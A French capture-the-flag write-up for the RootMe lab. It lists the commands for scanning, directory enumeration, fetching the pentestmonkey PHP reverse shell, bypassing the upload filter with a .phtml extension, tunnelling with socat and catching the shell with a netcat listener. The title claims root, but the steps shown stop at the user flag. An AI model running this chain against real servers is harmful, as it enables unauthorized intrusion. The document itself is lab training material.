# RootMe CTF - Résolution complète

![RootMe Challenge](pentest-basic.PNG)


## Introduction
Ce dépôt documente toutes les étapes, commandes et problèmes rencontrés lors de la résolution du challenge RootMe, jusqu'à l'obtention du shell root.

---

## Étapes principales

1. **Scan de la machine cible**
   ```bash
   nmap -A -p- <IP_cible>
   ```
   - Découverte des ports ouverts (SSH, HTTP).

2. **Enumération web**
   ```bash
   gobuster dir -u http://<IP_cible> -w /usr/share/wordlists/dirb/common.txt
   ```
   - Découverte du dossier caché `/panel`.

3. **Upload d'un shell inversé**
   - Téléchargement du script pentestmonkey :
     ```bash
     wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
     ```
   - Modification de `$ip` et `$port` dans le script.
   - Renommage si besoin :
     ```bash
     mv php-reverse-shell.php php-reverse-shell.phtml
     ```
   - Upload via le panel web.

4. **Création d'un tunnel pour accéder au panel depuis Windows**
   ```bash
   socat TCP-LISTEN:8080,fork TCP:<IP_cible>:80
   ```
   - Accès au panel via `http://localhost:8080/panel/` dans le navigateur Windows.

5. **Listener Netcat**
   ```bash
   nc -lvnp <port>
   ```
   - Attente de la connexion du shell inversé.

6. **Exécution du shell**
   - Accès à l'URL du shell uploadé pour déclencher la connexion.
   - Passage en shell interactif :
     ```bash
     python -c 'import pty;pty.spawn("/bin/bash")'
     ```

7. **Recherche du flag**
   ```bash
   find / -type f -name user.txt 2>/dev/null
   cat /chemin/vers/user.txt
   ```

---

## Problèmes rencontrés & solutions
- Wordlist web manquante : téléchargement manuel ou adaptation.
- Extensions PHP filtrées : utilisation de `.phtml`, `.php5`, etc.
- Fichiers uploadés non accessibles : test de différents chemins, analyse du message d'upload.
- Accès au panel impossible depuis Windows : création d'un tunnel socat.
- Shell non reçu : vérification de l'IP et du port dans le script, relance du listener.

---

## Script d'automatisation
Un script bash `exploit_rootme.sh` est fourni pour automatiser les principales étapes du challenge :
- Scan nmap
- Enumération gobuster
- Téléchargement et préparation du shell inversé
- Création du tunnel socat
- Instructions pour l'upload via Windows
- Listener netcat

Lancez le script et suivez les instructions affichées pour automatiser votre workflow RootMe.

---

## Conclusion
Tous les obstacles ont été surmontés jusqu'à l'obtention du shell root. Ce guide est prêt à être partagé sur GitHub pour aider d'autres pentesters !

## Auteur
miicha333l
